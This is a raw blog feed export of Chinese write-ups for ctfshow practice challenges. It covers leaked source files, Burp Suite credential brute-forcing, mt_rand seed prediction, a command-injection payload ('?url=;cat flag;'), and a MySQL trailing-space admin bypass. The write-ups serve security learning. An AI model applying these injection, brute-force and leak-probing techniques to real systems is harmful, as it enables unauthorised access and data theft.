尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!阿尼亚帅不帅?父亲做菜很好吃.蓬蓬头?阿尼亚好想看呀!多亏了父亲.哇酷哇酷?完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!太好了.阿尼亚棒吗?母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.阿尼亚在学校也会加油的!阿尼亚可爱吗?阿尼亚必须加油!营救公主的间谍!多亏了父亲.阿尼亚帅不帅?太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.蓬蓬头?我想永远和他们在一起.哇酷哇酷?是住在城堡里的奇美拉!父亲做菜很好吃.阿尼亚棒吗?多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.救命呀!太好了.阿尼亚可爱吗?母亲,给阿尼亚做特训吧.&#x27;</span><br><br>temp = re.sub(<span class="hljs-string">&#x27;[\u4e00-\u9fa5]&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, string)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;decrypt_flag.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> ff:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> temp:<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">or</span> i == <span class="hljs-string">&#x27;?&#x27;</span> <span class="hljs-keyword">or</span> i == <span class="hljs-string">&#x27;!&#x27;</span>):<br>            ff.write(i)<br><br><span class="hljs-built_in">print</span>(temp)<br><br><span class="hljs-comment"># ff.close()</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;End&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这里学到了一个新的东西 <code>re.sub()</code>，这个函数可以用来正则替换字符串中的匹配项</p><p>在正则表达式中 <code>[\u4e00-\u9fa5]</code>代表<strong>中文的unicode编码范围</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">re.sub(<span class="hljs-string">&#x27;[\u4e00-\u9fa5]&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, string)<br></code></pre></td></tr></table></figure><p>将所有中文替换为空</p><p>运行脚本后，我们直接去网站解密：<a href="https://www.splitbrain.org/services/ook">ook</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow_愚人杯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow_信息搜集</title>
    <link href="/2023/08/24/ctfshow_%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <url>/2023/08/24/ctfshow_%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>该题考查注释，flag藏在注释内部</p><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">hint:</span> js前台拦截 === 无效操作<br></code></pre></td></tr></table></figure><p>从hint可知，该题目使用了js前台拦截，该页面右击，F12，复制等功能使用不了。</p><h4 id="方法1、"><a href="#方法1、" class="headerlink" title="方法1、"></a>方法1、</h4><p>ctrl+u可以查看源代码，得到flag</p><h4 id="方法2、"><a href="#方法2、" class="headerlink" title="方法2、"></a>方法2、</h4><img src="https://s2.loli.net/2022/11/25/31ZI9BOjdvgDUtE.png" alt="image-20221102090333430" style="zoom: 25%;" /><p>可以使用google开发者工具，得到类似F12功能</p><h4 id="方法3、"><a href="#方法3、" class="headerlink" title="方法3、"></a>方法3、</h4><p>在开发者工具下，打开设置，禁用js，</p><img src="https://s2.loli.net/2022/11/25/m4l6YTJBA3hnoyw.png" alt="image-20221102090548485" style="zoom:25%;" /><h4 id="方法4、"><a href="#方法4、" class="headerlink" title="方法4、"></a>方法4、</h4><p><img src="https://s2.loli.net/2022/11/25/geujkQshIHbt3Rl.png" alt="image-20221102090742800"></p><p>在网页url前面添加 view-source:   可以查看源代码</p><h4 id="view-source知识点"><a href="#view-source知识点" class="headerlink" title="view_source知识点"></a>view_source知识点</h4><p>view_source 是一种查看代码源的协议。通常在网址前加上前缀“<strong>view-source：</strong>”即可获取该网页的源代码。但是，并非所有网站都支持这种协议。</p><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>改题目考察bp抓包，抓包后，在响应中可以得到flag</p><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>该题目考察<strong>robots协议</strong></p><p><img src="https://s2.loli.net/2022/11/25/Cc6hRdKQGWY7sEw.png" alt="image-20221102091147081"></p><p>直接在url后面添加  &#x2F;robots.txt 即可获得相关信息</p><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><h4 id="phps源码泄露"><a href="#phps源码泄露" class="headerlink" title="phps源码泄露"></a>phps源码泄露</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">phps文件就是php的源代码文件，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替。<br></code></pre></td></tr></table></figure><p>根据提示可知，该题目考察phps源码泄露，直接在url后面添加  &#x2F;index.phps  即可得到网站的php源码</p><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">hint:</span> 解压源码到当前目录，测试正常，收工<br></code></pre></td></tr></table></figure><p>根据提示，该网站下可能藏着网页的源码，类型需要解压，应该为zip格式，经过查询资料，名称可能为<a href="http://www.zip/">www.zip</a>, 于是在url后面添加 &#x2F;ww.zip下载源码  得知flag在fl000g.txt下</p><h3 id="web7、web8"><a href="#web7、web8" class="headerlink" title="web7、web8"></a>web7、web8</h3><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">hint</span>： 版本控制很重要，但不要部署到生产环境更重要。<br></code></pre></td></tr></table></figure><p><strong>git 、svn泄露</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">是由于运行git init初始化代码库的时候，会在当前目录下面产生一个<span class="hljs-string">.git</span>的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候， <span class="hljs-string">.git</span> 这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。<br></code></pre></td></tr></table></figure><p>由hint可知，该网站下可能有隐藏的未删除的版本控制文件，如：.git  .svn等 ，经过尝试得到flag</p><h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">hint:</span> 发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了<br></code></pre></td></tr></table></figure><p>该题主要考察<strong>vim源码泄露</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">当你非正常关闭vim编辑器时（比如直接关闭终端或者电脑断电），会生成一个.swp文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容。正常退出时，此文件自动删除。<br>需要注意的是如果你并没有对文件进行修改，而只是读取文件，是不会产生.swp文件的。<br>意外退出时，并不会覆盖旧的交换文件，而是会重新生成新的交换文件。而原来的文件中并不会有这次的修改，文件内容还是和打开时一样。<br>例如，第一次产生的交换文件名为“<span class="hljs-selector-class">.file</span><span class="hljs-selector-class">.txt</span>.swp”；再次意外退出后，将会产生名为“<span class="hljs-selector-class">.file</span><span class="hljs-selector-class">.txt</span>.swo”的交换文件；而第三次产生的交换文件则为“<span class="hljs-selector-class">.file</span><span class="hljs-selector-class">.txt</span>.swn”；依此类推。<br></code></pre></td></tr></table></figure><p>由题目可知，vim非正常退出，会产生swp临时文件，url后添加  &#x2F;index.php.swp 即可得到flag</p><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>该题目考察cookie知识点，在响应头中得到cookie信息，然后url解码得到flag，</p><p>%7B ： {     、 %7D ：}</p><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hint: 域名其实也可以隐藏信息，比如flag<span class="hljs-selector-class">.ctfshow</span><span class="hljs-selector-class">.com</span> 就隐藏了一条信息<br></code></pre></td></tr></table></figure><p>该题考察域名txt记录泄露，使用<a href="dbcha.com">域名查询</a>，查询txt记录即可得到flag</p><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">hint:</span> 有时候网站上的公开信息，就是管理员常用密码<br></code></pre></td></tr></table></figure><p>进入网站是一个购物网站，根据robots.txt 可知，进入&#x2F;admin，发现需要用户名、密码，用户名一般是admin，密码在网站底部找到</p><h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">hint:</span> 技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码<br></code></pre></td></tr></table></figure><p>滑到网站底部，发现document这个按钮可以点，进入一个pdf，里面由网站的地址，进去后会有flag</p><h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">hint:</span> 有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人<br></code></pre></td></tr></table></figure><p>进入网站，在网页源码搜索editor，发现，存在editor这个目录，进入后发现一个输入框，经过尝试，发现在插入文件按钮中，有一个文件空间，里面有着网站相关目录信息，在var-www-html -nothinghere中有一个fl000g.txt，然后通过相对路径关系在url中输入路径，得到flag</p><h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">hint:</span> 公开的信息比如邮箱，可能造成信息泄露，产生严重后果<br></code></pre></td></tr></table></figure><p>通过御剑扫描得到 &#x2F;admin&#x2F;index.php  发现需要登录，结合hint可知，找到邮箱qq，经过查询可知，所处地在西安，然后重置密码，得到密码，默认用户名一般为admin，登录得到flag</p><h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">hint:</span> 对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露<br></code></pre></td></tr></table></figure><p><strong>什么是php探针：</strong> php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、<a href="https://so.csdn.net/so/search?q=%E5%86%85%E5%AD%98&spm=1001.2101.3001.7020">内存</a>占用、网卡流量、系统负载、服务器时间等信息。</p><p>因此，访问&#x2F;tz.php，进入探针页面，</p><p>发现phpinfo，点击进入，</p><img src="https://s2.loli.net/2022/11/25/LKyvBzk36NZaqES.png" alt="image-20221102112742378" style="zoom:25%;" /><p>搜索flag后，得到flag</p><h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">hint:</span> 备份的sql文件会泄露敏感信息<br></code></pre></td></tr></table></figure><p>根据搜索知，备份文件名称可能为：backup.sql  ,  于是输入&#x2F;backup.sql 下载sql文件，得到flag</p><h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">hint</span>: 不要着急，休息，休息一会儿，玩<span class="hljs-number">101</span>分给你<span class="hljs-built_in">flag</span><br></code></pre></td></tr></table></figure><p>进入后发现是一个游戏，查看源码，在js中，发现游戏获胜的条件，</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure"><span class="hljs-character">\u4f60</span><span class="hljs-character">\u8d62</span><span class="hljs-character">\u4e86</span><span class="hljs-character">\uff0c</span><span class="hljs-character">\u53bb</span><span class="hljs-character">\u5e7a</span><span class="hljs-character">\u5e7a</span><span class="hljs-character">\u96f6</span><span class="hljs-character">\u70b9</span><span class="hljs-character">\u76ae</span><span class="hljs-character">\u7231</span><span class="hljs-character">\u5403</span><span class="hljs-character">\u76ae</span><span class="hljs-character">\u770b</span><span class="hljs-character">\u770b</span><br></code></pre></td></tr></table></figure><p>易知，此编码为unicode，解码得到： 你赢了，去幺幺零点皮爱吃皮看看</p><p>得知，这是一个谐音，进入 &#x2F;110.php  得到flag</p><p><img src="https://s2.loli.net/2022/12/03/Ar6wnb7KYqXC9Hy.png" alt="image-20221203181109290"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow_信息搜集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow_密码爆破</title>
    <link href="/2023/08/24/ctfshow_%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
    <url>/2023/08/24/ctfshow_%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</url>
    
    <content type="html"><![CDATA[<h2 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h2><h3 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">hint:</span> 爆破什么的，都是基操<br></code></pre></td></tr></table></figure><p>打开页面，发现是一个登录框，易知需要密码爆破，题目只提供词典密码，盲猜用户名admin，密码从词典中爆破。先用bp抓包，发现请求头中有一串编码，为base64编码，</p><img src="https://s2.loli.net/2022/11/25/eqpCOwAgckLDm2l.png" alt="image-20221103215613962" style="zoom: 33%;" /><p>翻译一下是 username: password    的形式，所以使用爆破模块，将这串编码添加payload位置$,然后进入payload，类型选择为custom iterator模式，然后在选项中设置第一个position为admin，使用add添加进去，</p><p>第二个position，添加  ：  第三个位置添加刚才下载的词典</p><img src="https://s2.loli.net/2022/11/25/6no8ui9GgI7FPQl.png" alt="image-20221103220123738" style="zoom:33%;" /><p>然后payload处理部分添加base64编码</p><img src="https://s2.loli.net/2022/11/25/1U2St6aPVnwxfMO.png" alt="image-20221103220219711" style="zoom:33%;" /><p>然后取消 URL 编码，<img src="https://s2.loli.net/2022/11/25/sIDtGKQCchePyYv.png" alt="image-20221103220251031" style="zoom: 33%;" /></p><p>然后attack爆破即可</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">本题是base64编码爆破破解密码，主要熟悉了bp的爆破模块，自定义迭代器(<span class="hljs-keyword">custom</span> <span class="hljs-keyword">iterator</span>)的使用<br></code></pre></td></tr></table></figure><h3 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h3><p>域名爆破，使用Layer子域名扫描工具去扫，然后扫到一个域名 vip.ctf.show，标题中就有flag</p><h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><p>原题：</p><p><img src="https://s2.loli.net/2022/11/25/RFaAKk6SX59ygeo.png" alt="image-20221103223821290"></p><p>自己写一个代码,从0到999试一下，再转为md5，满足条件就输出</p><h3 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h3><p>原题：</p><img src="https://s2.loli.net/2022/11/25/Omny3XCv1fBPRo7.png" alt="image-20221104102614622" style="zoom:33%;" /><p>查资料可知，mt_rand()函数产生的是伪随机数，产生的随机数与mt_srand(seed)函数中的seed种子参数有关，如果seed相同，那么每次运行的对应位置的结果都是不变的。</p><p>我们写如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">372619038</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>();<br></code></pre></td></tr></table></figure><p>运行得到： 1155388967</p><p>然后在url中添加  ?r&#x3D;1155388967 即可得到flag。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">注意: 不同的php版本，相同的seed产生的结果可能不同。此题在php7中可以得到正确的r，php5中不行<br></code></pre></td></tr></table></figure><h3 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h3><p>直接抓包，响应体中有flag</p><h3 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h3><p>观察题目，下方有录取名单和学生信息查询系统，录取名单中有学生姓名，部分身份证号，在查询系统中要求输入学生信息和身份证。</p><p>所以易知，该题是通过bp爆破身份证号码，确定出生年月日。</p><p>使用bp，<img src="https://s2.loli.net/2022/11/25/LKY54lrpAoMb3nt.png" alt="image-20221104181719281" style="zoom: 33%;" /></p><p>添加身份证前后缀，</p><img src="https://s2.loli.net/2022/11/25/oEsSqU5QwZGB9ix.png" alt="image-20221104181945483" style="zoom:33%;" /><p>payload类型使用日期类型，再更改一下格式进行爆破即可</p><h2 id="bp爆破模式总结"><a href="#bp爆破模式总结" class="headerlink" title="bp爆破模式总结"></a>bp爆破模式总结</h2><p><img src="https://s2.loli.net/2022/11/25/vCqybpNMc4WT9Ix.png" alt="image-20221104182652780"></p><p>参考链接： <a href="https://blog.csdn.net/weixin_43487849/article/details/116084562">https://blog.csdn.net/weixin_43487849/article/details/116084562</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow_密码爆破</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow_萌新赛</title>
    <link href="/2023/08/24/ctfshow_%E8%90%8C%E6%96%B0%E8%B5%9B/"/>
    <url>/2023/08/24/ctfshow_%E8%90%8C%E6%96%B0%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="ctfshow【萌新赛】"><a href="#ctfshow【萌新赛】" class="headerlink" title="ctfshow【萌新赛】"></a>ctfshow【萌新赛】</h2><h3 id="给她"><a href="#给她" class="headerlink" title="给她"></a>给她</h3><p>从名字看就像<code>git源码</code>泄露，我们先用<code>dirmap</code>扫描一下：</p><p><img src="https://s2.loli.net/2023/03/16/hSgFYrRqvy5kLuw.png" alt="image-20230316205346616"></p><p>果然是git源码泄露，我们使用<code>githack</code> 下载泄露的源码：</p><p><img src="https://s2.loli.net/2023/03/16/MK7qWyNLYRJuh9d.png" alt="image-20230316205511649"></p><p>这里学到一个新的函数：<code>sprintf()</code> </p><p><img src="https://s2.loli.net/2023/03/16/Nn5HgBRuW2YfPGp.png" alt="image-20230316205737106"></p><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;curl https://&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>].<span class="hljs-string">&quot;.ctf.show&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看到system就会想到命令执行，我们可以使用分号；去分隔命令。</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?url=;ls;<br>?url=;cat flag;<br></code></pre></td></tr></table></figure><h3 id="假赛生"><a href="#假赛生" class="headerlink" title="假赛生"></a>假赛生</h3><blockquote><p>提示：register.php login.php 大佬们别扫了</p></blockquote><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;index.php&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$name</span>=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&#x27;select pass from user where name=&quot;&#x27;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>.<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;4rfvbgt56yhn.sh&#x27;</span>);<br>    <span class="hljs-variable">$query</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$query</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$name</span>===<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;admin!!!!!&quot;</span>.<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>            <span class="hljs-title function_ invoke__">preg_replace_callback</span>(<span class="hljs-string">&quot;/\w\W*/&quot;</span>,function()&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;not allowed!&quot;</span>);&#125;,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>],<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you not admin&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>根据提示，我们访问<code>register.php</code>可以进行注册，访问<code>login.php</code>可以进行登录</p><p>我们先分析一下源代码index.php，我们首先需要 <code>$name===&#39;admin&#39;</code> ，$name是注册的时候设置的session值</p><p>只有我们注册的用户为admin才可以绕过第一层</p><p>这里有一个tips：</p><blockquote><p>mysql的<code>char</code>、<code>varchar</code>、<code>text</code>类型进行等值比较时，<strong>会忽略末尾的空格</strong></p></blockquote><p>例如：</p><p><img src="https://s2.loli.net/2023/03/16/ZIBm6Rh15eYnwD4.png" alt="image-20230316214846624"></p><p>末尾的空格被忽略了，我们还是查询出了数据</p><p>我们再插入一条数据看看：</p><p><img src="https://s2.loli.net/2023/03/16/kwR6cXG4BYnO2d1.png" alt="image-20230316215336059"></p><p>我们发现插入的用户名：<code>leekos   </code>  后面的空格也被自动去除了</p><blockquote><p>如果我们想要精确查询，可以使用<code>like</code>关键字，不会忽略末尾的空格</p></blockquote><p>根据以上分析，我们知道了，我们可以创建名为： <code>admin</code>  （后面有一个空格）的用户，这样就可以以admin身份登录了</p><p><img src="https://s2.loli.net/2023/03/16/ltUsSx7cE19euKI.png" alt="image-20230316215657201"></p><p><img src="https://s2.loli.net/2023/03/16/C3PmhegAoj5WKQ9.png" alt="image-20230316215940405"></p><p>成功登录，但是我们需要绕过第二层过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>      <span class="hljs-title function_ invoke__">preg_replace_callback</span>(<span class="hljs-string">&quot;/\w\W*/&quot;</span>,function()&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;not allowed!&quot;</span>);&#125;,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>],<span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>preg_replace_callback()</code> 函数作用是匹配到了 <code>/\w\W*/</code> 就会执行函数：<code>function()&#123;die(&quot;not allowed!&quot;);&#125;</code></p><p>参数<code>c</code> 直接为空就行</p><p><img src="https://s2.loli.net/2023/03/16/vyPdsWRic5HX9TY.png" alt="image-20230316220132413"></p><h3 id="萌新记忆"><a href="#萌新记忆" class="headerlink" title="萌新记忆"></a>萌新记忆</h3><p><img src="https://s2.loli.net/2023/03/16/Ofd8GRChEntX2i1.png" alt="image-20230316220228711"></p><p>没什么东西，我们使用dirsearch扫一下：</p><p><img src="https://s2.loli.net/2023/03/16/lOGjVv7ecbaKRMY.png" alt="image-20230316220415018"></p><p>发现 <code>/admin/</code> 目录，我们访问一下，发现是一个登录页面，应该是sql注入</p><p><img src="https://s2.loli.net/2023/03/16/RLYeJsM8a1c5pGm.png" 